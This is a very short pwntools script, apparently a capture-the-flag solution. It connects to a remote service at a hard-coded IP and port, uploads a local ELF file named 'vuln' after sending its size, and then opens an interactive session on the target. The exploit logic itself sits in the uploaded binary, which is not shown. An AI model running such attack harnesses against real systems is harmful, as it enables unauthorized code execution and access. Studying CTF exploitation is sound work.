from pwn import *
io = remote("3.115.58.219",9427)

f = open("vuln").read()
l = len(f)
io.sendlineafter("ELF size? (MAX: 6144)\n",str(l))
io.send(f)
io.interactive()
